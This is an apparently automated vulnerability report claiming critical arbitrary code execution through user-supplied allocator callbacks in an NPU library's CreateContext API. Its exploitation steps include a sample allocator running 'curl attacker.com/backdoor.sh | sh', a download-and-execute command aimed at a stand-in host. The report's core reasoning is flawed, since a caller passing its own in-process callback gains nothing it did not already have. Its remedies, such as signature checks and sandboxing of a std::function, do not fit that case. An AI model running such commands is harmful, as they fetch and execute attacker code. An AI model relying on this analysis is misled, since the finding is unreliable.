# SEC-001: Custom Allocator Arbitrary Code Execution

## Vulnerability Overview

| Attribute | Value |
|-----------|-------|
| **Vulnerability ID** | SEC-001 |
| **CWE** | CWE-94 (Improper Control of Generation of Code - Code Injection) |
| **Severity** | Critical |
| **Confidence** | 85/100 |
| **Type** | Arbitrary Code Execution |
| **Location** | `src/atb/context/context.cpp:41-64` |
| **Function** | `CreateContext` |
| **Affected Module** | Context Management |

### Summary
The `CreateContext` API accepts custom allocator/deallocator callback functions that are stored and invoked directly without any validation. A malicious user can inject arbitrary code execution via these callback functions, potentially achieving full system compromise, privilege escalation, or persistent access to the NPU device.

## Technical Details

### Code Path Analysis

**Entry Point:**
```cpp
// src/atb/context/context.cpp:41-64
Status CreateContext(Context **context, 
                     const std::function<void*(size_t)>& alloc, 
                     const std::function<void(void*)>& dealloc)
{
    // No validation of alloc/dealloc callbacks
    Status st = contextBase->Init(alloc, dealloc);  // Line 54
    // ...
}
```

**Propagation Path:**
1. **CreateContext** (context.cpp:41) → Accepts user-provided `std::function` callbacks
2. **ContextBase::Init** (context_base.cpp:51-74) → Stores callbacks in member variables:
   ```cpp
   allocateFunc_ = alloc;      // Line 67
   deallocateFunc_ = dealloc;  // Line 68
   ```
3. **DeviceTilingBufferPool Constructor** (context_base.cpp:75-76) → Passes callbacks to buffer pool
4. **DeviceTilingBufferPool::MallocTotalBuffer** (device_tiling_buffer_pool.cpp:21-32) → Executes callback:
   ```cpp
   return static_cast<uint8_t *>(allocateFunc_(static_cast<size_t>(bufferSize)));  // Line 31
   ```

### Trigger Conditions

The vulnerability is triggered when:
1. User calls `CreateContext` with custom allocator functions
2. Any operation requiring device tiling buffer allocation is performed
3. The `allocateFunc_` callback is invoked via `MallocTotalBuffer`

**Code snippet showing direct execution:**
```cpp
// device_tiling_buffer_pool.cpp:21-32
uint8_t *DeviceTilingBufferPool::MallocTotalBuffer(uint64_t bufferSize)
{
    if (!allocateFunc_) {
        // Default allocation using aclrtMalloc
    }
    // USER CALLBACK EXECUTED WITHOUT VALIDATION
    return static_cast<uint8_t *>(allocateFunc_(static_cast<size_t>(bufferSize)));
}
```

### Missing Validation

The following security checks are absent:
- No callback function address validation
- No callback function integrity check
- No sandboxing or execution context restriction
- No signature verification for callback functions
- No privilege level check for callback execution

## Attack Scenarios and Exploitation Steps

### Scenario 1: Code Injection Attack

**Attack Vector:** Python application using ATB library

**Exploitation Steps:**
1. Create a malicious allocator function in Python/C++:
   ```cpp
   void* malicious_alloc(size_t size) {
       // Execute arbitrary shell commands
       system("curl attacker.com/backdoor.sh | sh");
       // Return a valid pointer to avoid immediate crash
       return malloc(size);
   }
   ```
2. Pass malicious allocator to `CreateContext`:
   ```cpp
   atb::Context* ctx;
   atb::CreateContext(&ctx, malicious_alloc, malicious_free);
   ```
3. Trigger buffer allocation by executing any ATB operation
4. Malicious code executes with library privileges

### Scenario 2: Privilege Escalation

**Attack Vector:** Container or multi-user environment

**Exploitation Steps:**
1. Craft allocator that exploits NPU driver vulnerabilities
2. Use `aclrtMalloc` wrapper to achieve kernel-level access
3. Modify device memory to escalate privileges
4. Gain persistent access to NPU resources

### Scenario 3: Data Exfiltration

**Attack Vector:** Shared inference service

**Exploitation Steps:**
1. Create allocator that copies sensitive tensor data
2. Exfiltrate model weights, user inputs, or inference results
3. Send data to attacker-controlled endpoint
4. Maintain persistence through repeated allocations

## Remediation Recommendations

### Primary Fixes

1. **Remove Custom Allocator API (Recommended)**
   ```cpp
   // Remove the vulnerable API entirely
   // Only expose CreateContext(Context **context)
   ```

2. **Add Callback Validation**
   ```cpp
   Status CreateContext(Context **context, 
                        const std::function<void*(size_t)>& alloc, 
                        const std::function<void(void*)>& dealloc)
   {
       // Validate callback addresses
       if (alloc && !IsValidAllocator(alloc)) {
           return ERROR_INVALID_PARAM;
       }
       
       // Restrict to predefined allocator types
       if (!IsApprovedAllocator(alloc)) {
           return ERROR_INVALID_PARAM;
       }
       
       // Sandbox callback execution
       return contextBase->Init(SandboxAllocator(alloc), SandboxDeallocator(dealloc));
   }
   ```

3. **Use Whitelist-Based Allocator Registry**
   ```cpp
   class AllocatorRegistry {
       static std::set<AllocatorType> approvedAllocators_;
       
       static bool IsApproved(const std::function<void*(size_t)>& alloc) {
           // Check against whitelist
       }
   };
   ```

### Secondary Mitigations

1. **Add Security Documentation**
   - Warn users about custom allocator risks
   - Provide secure usage guidelines

2. **Add Runtime Monitoring**
   - Monitor allocator callback behavior
   - Detect anomalous execution patterns

3. **Add Access Control**
   - Restrict custom allocator API to privileged users
   - Add capability-based permission checks
